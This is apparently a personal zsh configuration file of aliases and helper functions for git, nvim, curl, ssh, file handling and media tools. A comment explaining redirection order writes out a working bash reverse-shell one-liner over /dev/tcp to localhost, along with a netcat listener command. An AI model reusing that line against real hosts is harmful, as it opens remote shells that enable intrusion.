#-------------------------------------------------------------
#
# Items in this files are roughly grouped in the following kind of categories:
#
# * helpers-for-zsh (for core cli experience)
#   Specific to zsh
#   (like j, zsh::safe_reload or NOOUT (global alias))
#
# * helpers-for-cli-tools (for common cli tools, dev-lang-agnostic, distro-agnostic)
#   Specific to my cli env
#   (like mkcd, ncdu, gclonecd, dl_file or ssh-password-only)
#
# * helpers-for-code-tools (for tech/dev tools, distro-agnostic)
#   Specific to my projects
#   (like venv* or dk)
#
# * helpers-for-distro-tools funcs/aliases
#   Specific to my distro
#   (like pac::list_useless_deps or nix-prefetch-url-tarball)
#
# * helpers-for-media-tools funcs/aliases
#   (like youtube-dl or ffmpeg)
#
# * helpers-for-gui funcs/aliases
#   (like @mpv (? not in this file))
#
# => Start by moving them to separate files?


# === zsh core

function zsh::utils::check_can_reload_or_exit() {
  if [[ -n "$(jobs)" ]]; then
    local prefix="Error"
    [[ -n "${1:-}" ]] && prefix="Cannot $1"

    print -P "${prefix}: %j job(s) in background"

    return 1 # cannot reload nor exit!
  else
    return 0 # all good, do whatever you want!
  fi
}

function zsh::safe_reload() {
  zsh::utils::check_can_reload_or_exit "reload" || return 1

  [[ -n "$ORIGINAL_PATH" ]] && export PATH="$ORIGINAL_PATH"
  >&2 echo "--- Reloading 'zsh' safely"
  exec zsh
}

function zsh::safe_exit() {
  zsh::utils::check_can_reload_or_exit "exit" || return 1

  >&2 echo "--- Exiting safely, bye!"
  exit
}

function zsh::nuke_exit() {
  # Ensures the shell cannot save history before quitting!
  kill -9 $$
}

alias zshrc=zsh::safe_reload
alias ":r"=zsh::safe_reload
alias ":q"=zsh::safe_exit
alias ":qqq"=zsh::nuke_exit

# global redirection aliases

alias -g NOOUT=">/dev/null"
alias -g NOERR="2>/dev/null"
alias -g ERR2OUT="2>&1"
alias -g NOOUTPUT="NOOUT NOERR"
# interesting link on redirections order: https://wiki.bash-hackers.org/howto/redirection_tutorial
# alias -g NOOUTPUT="3>/dev/null 1>&3 2>&3"
# ==> creates fd 3 to /dev/null then redirects fd 1,2 to THE VALUE OF fd 3 (an fd of /dev/null)
#
# And another one: https://hypothetical.me/post/reverse-shell-in-bash/
# so a bash reverse shell looks like (listen with `nc -lp 4444`):
# (in bash): bash -i 3>/dev/tcp/127.0.0.1/4444 >&3 2>&3 0<&3
# ==> creates fd 3 to tcp connection then redirects fd 0,1,2 to THE VALUE of fd 3 (which is a
#     bidirectional tcp conn to localhost:4444)
#     Note: not sure why but `0<&3` and `0>&3` works the same. we assign values of fd to fd, but
#     not write-only/read-only ? So it's not possible to redirect stdin for reading or writing to
#     different files?

# Override 'r' to run the last command stored in history instead of the real last typed command
# which may start with a space and should be ignored!
# (space-leading commands are properly ignored now!)
#
# fc    : Command to manipulate zsh history
# -L    : Use the local history (in case shared_history is set)
# -e -  : Do not edit the command, directly execute it
# -1    : Select the last command
alias r="fc -L -e - -1"

# Append current in-memory history to the HISTFILE
alias history::append-to-histfile="fc -A"
# Read history from the HISTFILE, only import new entries
alias history::read-new-from-histfile="fc -RI"

# Import zsh's massive rename helper
autoload -U zmv
alias zmv='noglob zmv'
alias zcp='zmv -C'
alias zln='zmv -L'
alias zmv::dry-run='zmv -n'
alias zcp::dry-run='zcp -n'
alias zln::dry-run='zln -n'


# === common CLI tools / dev-lang-agnostic / distro-agnostic

# Shorters

alias g=git
alias tre=tree
alias tx=tmux
alias j=just

# Force tmux to be compatible UTF-8
# (256 colors & RGB are enabled in tmux config, via `terminal-features`)
alias tmux="tmux -u"

# Big-one letter aliases
alias H=head
alias T=tail
alias L=less

# Add verbosity to common commands

# alias rm="rm -vI" # disabled in favor of trash
alias cp="cp -vi"
alias mv="mv -vi"
alias ln="ln -iv"
alias mkdir="mkdir -v"
alias rename="rename -v"

# rm/trash

alias rmpermanantly="command rm -vI"
function rm() {
  local rm_confirmation
  echo
  echo -n "👉 Are you sure? [yes/…] "
  read rm_confirmation
  if [[ "$rm_confirmation" == "yes" ]]; then
    echo '=> ⚠️ `rm …` CONFIRMED'
    echo
    rmpermanantly "$@"
  else
    echo '=> ❌ `rm …` CANCELLED'
    echo
    return 1
  fi
}
if cfg::has-bin trashy; then
  # For once https://github.com/oberblastmeister/trashy/pull/106 is released
  alias trash=trashy
fi
# for easier completion (`rmt<compl>`)
alias rmtrash=trash


# ls

if cfg::has-bin eza; then
  # eza-specific aliases
  alias eza="eza --group-directories-first"
  alias ltre="eza -la --tree --git-ignore --classify=auto"
  alias lltre="eza -l --tree --git-ignore --classify=auto"

  alias ls-backend="eza"
else
  alias ls-backend="command ls"
fi

alias ls="ls-backend --group-directories-first --color=auto --classify=auto"
alias ll="ls -l"
alias la="ll -a"
alias l="la"
alias l1="ls -1"


# mkdir

alias mkd="mkdir -p" # note: `mkdir` has -v applied already

# Creates 1 or more directories, then cd into the first one
function mkcd() {
  mkd "$@"
  cd "$1"
}

# -C : Enable colors
# -F : Show type of files (like ls -F)
# -A : use ANSI line graphics hack when printing indentation lines (seems necessary in tmux)
# --dirsfirst : Dirs then files
alias tree="tree -C --dirsfirst -F -A"


# cd

alias ..="cd ..;"
alias ...="cd ../..;"
alias ....="cd ../../..;"
# IDEA: Remap `.` in ZLE to make these aliases dynamic in zsh, for arbitrary depth, and work even
#   inside a ,
#   where I can preview (below prompt in message area) the directory I'm targeting as I add dots..

# Shared core for cdot/cdt/cdgit: cd into <root>/<subdir> (<root> itself when <subdir> is omitted).
# Can pass `--label <label>` to override root name shown in error messages (defaults to <root>).
function cdsubdir() {
  # zparseopts flags:
  # * -D strips matched opts from $@
  # * -E keeps parsing past non-options
  # * `--` ends zparseopts' own opts
  # * `-label:=label_opt` matches `--label <val>`
  #
  # zparseopts always stores parsed result into an array:
  # * label_opt[1]=opt name
  # * label_opt[2]=value
  local -a label_opt
  zparseopts -D -E -- -label:=label_opt || return 1

  local root="$1"
  local subdir="${2:-}" # may be unset/empty
  local label="${label_opt[2]:-$root}"
  [[ -n "$root" ]] || {
    >&2 echo "cdsubdir: <root> is required!"
    return 1
  }
  [[ -d "$root/$subdir" ]] || {
    >&2 echo "$label/$subdir doesn't exist 🤔"
    return 1
  }
  cd "$root/$subdir"
}

# Shared completer core: offer dirs under <root>, relative to it.
function _cdsubdir::completer() {
  local root="$1"
  [[ -n "$root" && -d "$root" ]] || return 1
  _directories -W "$root"
}

# Completer for cdsubdir used directly: complete <root>, then <subdir> under it.
# note: doesn't handle `--label <val>` (only ever passed by the wrappers)
function _cdsubdir() {
  if (( CURRENT == 2 )); then
    _directories
  else
    local root="${words[2]}"
    root="${root/#\~/$HOME}" # `-W` doesn't expand `~`, so do it here
    if [[ -d "$root" ]]; then
      _directories -W "$root"
    else
      zle -M "⚠️ '$root' doesn't exist!"
    fi
  fi
  return 0 # no matches -> don't fallback to default completers
}
compdef _cdsubdir cdsubdir

# cd to /tmp, or to a subdir of it
function cdt() {
  cdsubdir /tmp "$1"
}
function _cdt() { _cdsubdir::completer /tmp }
compdef _cdt cdt

# cd to my dotfiles repo, or to a subdir of it
function cdot() {
  local dotfiles_path=$(readlink ~/.dot)
  [[ -n "$dotfiles_path" ]] || { echo "~/.dot does not exist???"; return }
  cdsubdir --label '~dot' "$dotfiles_path" "$1"
}
# note: the function version ensures that the symlink is not registered in cd history / zoxide..
# (avoids implicit duplication with the realpath of dotfiles repo)
alias dot=cdot cdd=cdot
# note: `cdot` is more logical (think: `cd` then `dot`),
#   but `dot` is easier to type on my ortholinear keyboard.. So I need both ¯\_(ツ)_/¯
function _cdot() { _cdsubdir::completer $(readlink ~/.dot) }
compdef _cdot cdot


# git

alias git::no-pager="git --no-pager"
alias gnp=git::no-pager

alias git::watch-output="watch --color -- git --no-pager -c color.ui=always"

alias gomain="git go main"
alias goback="git go -"

alias ghh="gh pr checkout"

# cd to the git root, or to a subdir of it
function cdgit() {
  local git_root
  git_root=$(git rev-parse --show-toplevel) || return 1
  cdsubdir --label 'git-root' "$git_root" "$1"
}
alias cdg=cdgit

function _cdgit() { _cdsubdir::completer "$(git rev-parse --show-toplevel)" }
compdef _cdgit cdgit

# Clone git repository and cd to it
#
# Handles the following invocations:
# - gclonecd <url>
# - gclonecd <url>.git
# - gclonecd <url>      destination_dir
# - gclonecd <url>.git  destination_dir
function gclonecd() {
  local clone_dir
  if [[ -n "$2" ]] && ! [[ "$2" =~ "-" ]]; then
    clone_dir="$2"
  else
    # basename of url, removing '.git' if present
    clone_dir=$(basename "$1" .git)
  fi
  git clone "$@" && cd "$clone_dir"
}

# git-diff based diff (with delta <3)
alias gdiff="git dd --no-index"
alias gdiff::split="git dds --no-index"


# nvim

alias e="nvim"
alias v="nvim -R"
# e: edit | v: view

# Edit scratch buffer with given file extension (immediate insert mode!)
function _nvim-guess-filetype() {
  local extension="$1"
  local script="
    vim.cmd'filetype on'
    local ft = vim.filetype.match { filename = 'foo.$extension' }
    io.write(tostring(ft))
  "
  local filetype=$(echo "$script" | nvim --headless -l -)
  # echo "filetype=$filetype" # DEBUG
  if [[ -z "$filetype" ]] || [[ "$filetype" == "nil" ]]; then
    >&2 echo "/!\\ Unknown extension, using filetype=$extension"
    filetype="$extension"
  else
    >&2 echo "Deduced filetype=$filetype"
  fi
  echo -n "$filetype"
}
function ef() {
  local extension="$1"
  local filetype=
  if [[ -n "$extension" ]]; then
    filetype=$(_nvim-guess-filetype "$extension")
  fi
  nvim +enew +"set ft=$filetype" +"set buftype=nofile" +startinsert
}

# Open nvim in 'AI' mode, ready to type ✨
# Can also be called with an initial prompt that will immediately be answered 🚀
function ei() {
  nvim +"CodeCompanionChat $*" +only +startinsert
}
alias ei="nvim +CodeCompanionChat +only +startinsert"

# Open nvim to edit given directory (default: cwd)
function ed() {
  local dir_path="."
  if [[ $# -ge 1 ]]; then
    dir_path=$1
    shift
  fi
  nvim "$dir_path" "$@"
}

# Search using `rg` & open the results in neovim via quickfix entries
function erg() {
  local tmpfile=$(mktemp -t rg-quickfix-results-XXX)
  rg --vimgrep "$@" > "$tmpfile"
  local ret=$?
  if [[ $ret != 0 ]]; then
    if [[ $ret == 1 ]]; then
      echo >&2 "Zero matches..."
    else
      echo >&2 "ERROR: rg exited with status $ret"
    fi
    return $ret
  fi
  nvim -q "$tmpfile" +copen || true
  command rm "$tmpfile"
}

# rg

alias todo='rg -i "todo|fixme" --colors=match:fg:yellow --colors=match:style:bold'
# Add line numbers when output is not a tty,
# allows to use output as input to `nvim -q <results-file>` for easy navigation \o/
alias rg='rg -n'

# opencode

if cfg::has-bin opencode; then
  alias oc=opencode
fi
# Resume last opencode session
alias occ="opencode --continue"

# curl

# Download a single file
# --remote-name (-O): Write output to a file (use URL to deduce filename by default, see -J)
#
# --remote-header-name (-J): Use filename from Content-Disposition header if present (usually better than the URL)
#
# --location (-L): Follow redirects
alias dl_file="curl -OJ -L"

alias curl_json='curl -H "Accept:application/json" -H "Content-Type:application/json"'

function curl_auth() {
  local token="$1"; shift
  if [[ -z "$token" ]]; then
    >&2 echo "Missing <token>"
    return 1
  fi
  curl -H "Authorization: Bearer $token" "$@"
}

function curl_auth_json() {
  local token="$1"; shift
  if [[ -z "$token" ]]; then
    >&2 echo "Missing <token>"
    return 1
  fi
  curl_auth "$token" -H "Accept:application/json" -H "Content-Type:application/json" "$@"
}


# ssh

# Always expose a widely known TERM (n../zsh/rc/aliases_and_short_funcs.zshot the tmux one) to the server I'm connecting to.
alias ssh="TERM=xterm-256color ssh"

alias ssh-password-only="ssh -o PubkeyAuthentication=no"

alias ssh-keygen-ed25519="ssh-keygen -t ed25519"


# sudo

# Makes sudo work with alias (e.g. 'sudo pac' => 'sudo pacman')
# Note: the trailing space is important (see the man for the zsh alias builtin)
alias sudo="sudo "
alias nosudo="nosudo "
compdef _sudo nosudo


# misc

# ncdu
alias ncdu='ncdu --color dark'

# Search the given bin name in PATH (ignores aliases/functions)
# -p : always search in PATH
# -s : show the realpath in addition to the path in PATH
alias which::realpath="echo \"-- note: use 'show-symlinks-chain' for more details\"; which -ps"

# ps
# -f : full listing (show process name & args)
# --forest : Show a processes hierarchy
alias pss="ps -f --forest"

# ping
alias pg="ping google.fr"

function cheatsh() {
  curl cht.sh/$1
}


# text translation (with https://github.com/soimort/translate-shell)

# translation
alias fr:en='trans fr:en -b'
alias en:fr='trans en:fr -b'
function fr:en:fr() {
  local fr_en="$(fr:en $*)" && echo "en: $fr_en" && en:fr "$fr_en"
}
function en:fr:en() {
  local en_fr="$(en:fr $*)" && echo "fr: $en_fr" && fr:en "$en_fr"
}

# definition
alias en:def='trans en: -d'
alias fr:def='trans fr: -d'


# === tech/dev-lang tools, distro-agnostic

# python

alias py=python
alias ipy="ipython --no-confirm-exit"

# TODO: move somewhere else / do differently?
alias venv::load_helpers="source ~/.dot/shell/venv_helpers.sh"


# === media tools

# chafa
# NOTE: chafa without custom options is really great on its own!
alias chafa::braille="chafa -c 256 --fg-only --symbols braille"
alias chafa::braille::small="chafa::braille --size 70x70"

# youtube-dl
alias ytdl='yt-dlp'
alias ytdl-m4a='ytdl --extract-audio -f m4a --ignore-errors'
alias ytdl-m4a-nolist='ytdl-m4a --no-playlist'

# mpv
alias mpv-audio='mpv --no-video'
alias mpv-audio-loop='mpv-audio --loop-playlist'

alias tv-start='@mpv daemon-start tv --no-terminal --force-window'
alias tv-add='@mpv add tv'

# ffmpeg
alias ffmpeg='ffmpeg -hide_banner'
alias ffprobe='ffprobe -hide_banner'
alias ffmpeg-no-verbose='ffmpeg -loglevel warning -stats'
